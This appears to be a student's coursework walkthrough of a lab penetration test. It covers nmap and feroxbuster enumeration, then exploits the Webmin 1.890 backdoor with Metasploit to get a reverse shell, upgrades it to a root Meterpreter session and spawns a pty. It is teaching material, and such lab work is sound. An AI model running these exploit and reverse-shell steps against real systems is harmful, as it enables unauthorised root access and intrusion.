# CF Coursework 2

## Remote Enumeration

### Initial NMAP Scan of Whole Network
``` 
┌──(kali@kali-99-590)-[~]
└─$ sudo nmap 10.1.26.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:08 GMT
Nmap scan report for 10.1.26.1
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: FA:16:3E:54:7D:F0 (Unknown)

Nmap scan report for 10.1.26.2
Host is up (0.0020s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:B6:7A:98 (Unknown)

Nmap scan report for 10.1.26.3
Host is up (0.0020s latency).
All 1000 scanned ports on 10.1.26.3 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: FA:16:3E:DB:FA:60 (Unknown)

Nmap scan report for 10.1.26.4
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:90:8D:AD (Unknown)

Nmap scan report for 10.1.26.5
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:77:33:1D (Unknown)

Nmap scan report for 10.1.26.30
Host is up (0.0019s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
10000/tcp open  snet-sensor-mgmt
MAC Address: FA:16:3E:59:F5:C8 (Unknown)

Nmap scan report for kali-99-590 (10.1.26.20)
Host is up (0.0000060s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (7 hosts up) scanned in 2.54 seconds
```

- Nothing too interesting from 10.1.26.1 - 10.1.26.5
- 10.1.26.30 has some interesting ports open so we will do a more detailed scan of that machine

### Nmap Scan of 10.1.26.30
- -sC to run default scripts 
- -sV to enumerate versions

``` 
┌──(kali@kali-99-590)-[~]
└─$ sudo nmap -sC -sV 10.1.26.30                                                                                                                                                                             130 ⨯
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:19 GMT
Nmap scan report for 10.1.26.30
Host is up (0.00077s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ea0b9c1d0ffba6399a15c00e9747cb83 (RSA)
|   256 a4feb3d4863dde1b7c71fe833db89ace (ECDSA)
|_  256 c5198035f76360ad38ae75cc8fc41969 (ED25519)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34230/tcp   mountd
|   100005  1,2,3      34373/udp6  mountd
|   100005  1,2,3      42366/udp   mountd
|   100005  1,2,3      46250/tcp6  mountd
|   100021  1,3,4      42944/tcp   nlockmgr
|   100021  1,3,4      44892/tcp6  nlockmgr
|   100021  1,3,4      54835/udp6  nlockmgr
|   100021  1,3,4      58101/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl 2-3 (RPC #100227)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: FA:16:3E:59:F5:C8 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
```

- This shows some interesting things
- We have ssh running which could be brute forced if the password isn't strong enough
- Apache 2.4.18 which could possibly be exploited
- An nfs share we can mount to upload files to the server
- MiniServ 1.89 which can be exploited to get a shell

### Looking at the Apache Server
![[apache-default-page.png]]

- Nothing interesting on the index page so use feroxbuster to enumerate resources on the server

### Feroxbuster
- Search for html, php and txt files
```
┌──(kali㉿kali-99-590)-[~]
└─$ feroxbuster -u http://10.1.26.30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt                                                                                           1 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.26.30
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html, php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://10.1.26.30/
200      GET      375l      968w    11321c http://10.1.26.30/index.html
403      GET        9l       28w      275c http://10.1.26.30/.html
403      GET        9l       28w      275c http://10.1.26.30/.php
403      GET        9l       28w      275c http://10.1.26.30/server-status
[####################] - 1m    882184/882184  0s      found:5       errors:0
[####################] - 1m    882184/882184  7816/s  http://10.1.26.30/
```

- Nothing of interest was found - seems just like a default Apache server

## Initial Access

- From nmap we can see we have webmin 1.890 running on port 10000
- This version is vulnerable to a backdoor exploit that we can run using metasploit

```
Metasploit tip: Use the resource command to run
commands from a file
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search webmin 1.89

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor
```

- We can then setup the exploit with the options for the victim server and run the exploit


```
msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.30
RHOSTS => 10.1.26.30
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.1.26.20
LHOST => 10.1.26.20
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.1.26.20:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
```

- This gives us a shell on the server, granted not the best shell in the world

```
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000

ls
JSON
LICENCE
LICENCE.ja
README
WebminCore.pm
WebminUI
```

### Upgrading the shell

- To make this shell more usable we can utilise the metsploit feature meterperter shell

```
^Z
Background session 2? [y/N]  y
msf6 exploit(linux/http/webmin_backdoor) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(linux/http/webmin_backdoor) > use 0
```

```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
  2         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.1.26.20:4433
[*] Sending stage (1017704 bytes) to 10.1.26.30
[*] Meterpreter session 3 opened (10.1.26.20:4433 -> 10.1.26.30:51376) at 2023-03-06 13:58:30 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
  2         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
  3         meterpreter x86/linux  root @ 192.168.130.34  10.1.26.20:4433 -> 10.1.26.30:51376 (10.1.26.30)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 3
[*] Starting interaction with 3...

meterpreter >
```

- We now have a meterpreter shell!
- Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
- Also note we arent on amd64 we are on i686 which is 32bit - this could pose a problem for compiling some of our exploits

```
meterpreter > sysinfo
Computer     : 192.168.130.34
OS           : Ubuntu 16.04 (Linux 4.4.0-210-generic)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```

- we can upgrade our shell further by using the python pty library
- and export TERM=xterm will give you the ability to clear the screen
```
meterpreter > shell
Process 32222 created.
Channel 2 created.
python -c 'import pty; pty.spawn("/bin/bash")'
root@srv-99-590:/usr/share/webmin#
```

